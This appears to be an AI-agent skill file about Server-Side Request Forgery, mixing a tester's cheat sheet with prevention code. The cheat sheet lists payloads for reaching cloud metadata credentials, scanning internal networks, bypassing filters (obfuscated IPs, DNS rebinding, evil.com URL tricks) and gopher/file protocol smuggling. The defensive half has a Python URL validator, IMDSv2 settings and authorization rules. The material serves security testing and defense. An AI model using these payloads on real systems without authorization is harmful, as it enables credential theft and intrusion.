---
name: ssrf-detection
description: >-
  Detect, exploit, and prevent Server-Side Request Forgery (SSRF) vulnerabilities.
  Use when tasks involve testing for SSRF in web applications, accessing internal
  services through SSRF, bypassing SSRF filters, implementing SSRF prevention,
  or auditing applications that fetch external URLs. Covers blind and non-blind
  SSRF, cloud metadata exploitation, and defense strategies.
license: Apache-2.0
compatibility: "Python 3.8+ for prevention code, AWS CLI for cloud metadata sections"
metadata:
  author: terminal-skills
  version: "1.0.0"
  category: devops
  tags:
    - ssrf
    - web-security
    - penetration-testing
    - owasp
    - cloud-security
---

# SSRF Detection

## Overview

Find, exploit, and fix Server-Side Request Forgery. SSRF tricks the server into making HTTP requests to unintended destinations — accessing internal services, cloud metadata, or other systems that the server can reach but the attacker cannot.

## Instructions

### How SSRF Works

```
Normal flow:
  User → Server → External API (intended)

SSRF attack:
  User sends: url=http://169.254.169.254/latest/meta-data/
  Server → AWS Metadata Service (unintended)
  Server returns: IAM credentials, instance info, etc.
```

Any feature that takes a URL from user input and fetches it server-side is a potential SSRF vector:
- Image/file URL imports ("paste image URL")
- Webhook configurations
- PDF generators that fetch external resources
- URL preview/unfurl features (Slack-style link previews)
- API integrations with user-provided endpoints
- RSS/feed readers
- Document converters

### SSRF Types

### Non-blind (classic) SSRF

The server returns the response body to the attacker:

```
Request:  GET /fetch?url=http://internal-api:8080/admin/users
Response: {"users": [...all internal user data...]}

The attacker sees the response from the internal service.
```

### Blind SSRF

The server makes the request but doesn't return the response body. The attacker confirms SSRF through:

```
1. Timing differences:
   url=http://10.0.0.1:22 (SSH port — fast connection)
   url=http://10.0.0.1:12345 (closed port — timeout)
   Different response times confirm port is open/closed

2. Out-of-band callbacks:
   url=http://attacker-controlled.burpcollaborator.net
   If the server sends a DNS/HTTP request to your server, SSRF confirmed

3. Error message differences:
   url=http://10.0.0.1 → "Connection refused" (host exists)
   url=http://10.0.0.99 → "Host unreachable" (host doesn't exist)
```

### Semi-blind SSRF

The full response isn't returned, but partial information leaks — error messages, response times, status codes, or content length.

### Detection and Exploitation

### Testing methodology

```
1. IDENTIFY input points that accept URLs:
   - Search for parameters: url=, uri=, path=, src=, dest=, redirect=,
     link=, feed=, host=, site=, callback=, webhook=, proxy=
   - Look for features: "import from URL", "add webhook", "preview link"

2. TEST with external callback:
   url=http://your-burp-collaborator.com
   url=http://your-server.com/ssrf-test
   → If you receive the request, basic SSRF confirmed

3. TEST internal access:
   url=http://localhost
   url=http://127.0.0.1
   url=http://[::1]                    # IPv6 localhost
   url=http://169.254.169.254          # AWS metadata
   url=http://metadata.google.internal # GCP metadata
   url=http://100.100.100.200          # Azure metadata

4. MAP internal network:
   url=http://10.0.0.1 through url=http://10.0.0.255
   url=http://172.16.0.1 through url=http://172.31.255.255
   url=http://192.168.0.1 through url=http://192.168.255.255
   → Use response time/error differences to identify live hosts

5. SCAN internal ports:
   url=http://10.0.0.5:22    (SSH)
   url=http://10.0.0.5:3306  (MySQL)
   url=http://10.0.0.5:6379  (Redis)
   url=http://10.0.0.5:9200  (Elasticsearch)
```

### Cloud metadata exploitation

Cloud instances have metadata services accessible at well-known IPs:

```
AWS (most impactful — can yield IAM credentials):
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
  → Returns: AccessKeyId, SecretAccessKey, Token

GCP:
  http://metadata.google.internal/computeMetadata/v1/
  Header required: Metadata-Flavor: Google
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  Header required: Metadata: true

DigitalOcean:
  http://169.254.169.254/metadata/v1/
```

### Filter bypass techniques

When basic SSRF payloads are blocked:

```
IP address obfuscation:
  127.0.0.1      → 2130706433 (decimal)
  127.0.0.1      → 0x7f000001 (hex)
  127.0.0.1      → 0177.0.0.1 (octal)
  127.0.0.1      → 127.1 (short form)
  127.0.0.1      → 0 (on some systems)

DNS rebinding:
  Register a domain that resolves to 127.0.0.1
  First resolution → external IP (passes allowlist check)
  Second resolution → 127.0.0.1 (actual request)
  Tools: rebind.it, taviso/rbndr

URL parsing tricks:
  http://evil.com#@expected.com    # Fragment confusion
  http://expected.com@evil.com     # Username in URL
  http://evil.com/..;/internal     # Path traversal
  http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ           # Unicode normalization

Protocol smuggling:
  gopher://127.0.0.1:6379/_*3%0d%0a...  # Redis commands via gopher
  dict://127.0.0.1:6379/info             # Redis info via dict protocol
  file:///etc/passwd                      # Local file read
```

### Prevention

### URL validation

```python
# ssrf_prevention.py
# Validate URLs to prevent SSRF attacks

import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),        # Private
    ipaddress.ip_network('172.16.0.0/12'),      # Private
    ipaddress.ip_network('192.168.0.0/16'),     # Private
    ipaddress.ip_network('127.0.0.0/8'),        # Loopback
    ipaddress.ip_network('169.254.0.0/16'),     # Link-local (metadata)
    ipaddress.ip_network('100.64.0.0/10'),      # Carrier-grade NAT
    ipaddress.ip_network('::1/128'),            # IPv6 loopback
    ipaddress.ip_network('fc00::/7'),           # IPv6 private
    ipaddress.ip_network('fe80::/10'),          # IPv6 link-local
]

def validate_url(url: str) -> bool:
    """Validate a user-provided URL is safe to fetch.
    
    Checks: scheme allowlist, DNS resolution to non-private IP,
    no IP address obfuscation, no redirect to internal networks.
    
    Args:
        url: User-provided URL to validate
    
    Returns:
        True if URL is safe to fetch
    
    Raises:
        ValueError: If URL is blocked for SSRF prevention
    """
    parsed = urlparse(url)
    
    # 1. Scheme allowlist — only http and https
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Blocked scheme: {parsed.scheme}")
    
    # 2. No IP addresses in URL — force DNS resolution
    hostname = parsed.hostname
    if not hostname:
        raise ValueError("No hostname in URL")
    
    # 3. Resolve DNS and check against blocked networks
    try:
        resolved_ips = socket.getaddrinfo(hostname, parsed.port or 443)
    except socket.gaierror:
        raise ValueError(f"Cannot resolve: {hostname}")
    
    for family, type_, proto, canonname, sockaddr in resolved_ips:
        ip = ipaddress.ip_address(sockaddr[0])
        for network in BLOCKED_NETWORKS:
            if ip in network:
                raise ValueError(
                    f"Blocked: {hostname} resolves to private IP {ip}"
                )
    
    return True
```

### Cloud metadata protection

```bash
# AWS: Require IMDSv2 (token-based) — blocks SSRF because
# the attacker can't set the required PUT header through SSRF
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890 \
  --http-tokens required \
  --http-endpoint enabled

# GCP: Metadata service already requires header
# Metadata-Flavor: Google — blocks basic SSRF
# But some HTTP libraries add custom headers from redirects

# Network-level: Block metadata IP in firewall rules
iptables -A OUTPUT -d 169.254.169.254 -j DROP  # Nuclear option
# Better: use IMDSv2 + application-level URL validation
```

### Architecture-level defenses

```
1. NETWORK SEGMENTATION
   Don't let web servers reach internal services directly.
   Use a dedicated proxy/gateway for outbound requests.

2. DEDICATED FETCHER SERVICE
   Move URL fetching to an isolated microservice with:
   - Its own network policy (can't reach internal services)
   - Allowlist of permitted destination domains
   - Response size limits
   - Timeout limits

3. DNS RESOLUTION PINNING
   Resolve DNS BEFORE making the request.
   Use the resolved IP for the actual connection.
   This prevents DNS rebinding attacks.

4. DISABLE UNNECESSARY PROTOCOLS
   Block: gopher://, file://, dict://, ftp://
   Allow only: http://, https://
```

## Examples

### Test a web application for SSRF

```prompt
Our web application has a "fetch URL" feature that generates link previews. Test it for SSRF vulnerabilities: check if it can reach internal services (localhost, private IPs, cloud metadata), test filter bypasses (IP encoding, DNS rebinding, protocol smuggling), and map any accessible internal network. For each finding, demonstrate the impact and provide a proof-of-concept. We're running on AWS EC2.
```

### Secure a URL fetching feature against SSRF

```prompt
Our Node.js application has an endpoint that accepts a URL and fetches content for preview cards (similar to Slack's link unfurling). It currently uses axios with no validation. Implement comprehensive SSRF prevention: URL validation with DNS resolution checks, private IP blocking (including IPv6), scheme allowlist, redirect following with re-validation at each hop, timeout and size limits, and IMDSv2 enforcement on our AWS infrastructure.
```

### Audit cloud infrastructure for SSRF exposure

```prompt
Audit our AWS infrastructure for SSRF exposure. Check all EC2 instances for IMDSv1 (should be IMDSv2 only), review security groups for overly permissive internal access, identify application endpoints that accept URLs, and verify network segmentation between web-facing services and internal databases. Produce a risk report with prioritized remediation steps.
```

## Guidelines

- Only test for SSRF on applications you have explicit written authorization to test
- Cloud metadata exploitation can expose real IAM credentials — handle findings as sensitive data and report through secure channels
- SSRF testing against internal networks can disrupt services — coordinate with the infrastructure team before scanning internal IP ranges
- Always implement both application-level URL validation and network-level controls (IMDSv2, network segmentation) as defense-in-depth
- DNS rebinding bypasses require a controlled domain — never use rebinding against targets without explicit scope authorization
- Report all SSRF findings through responsible disclosure, especially when cloud credentials are exposed
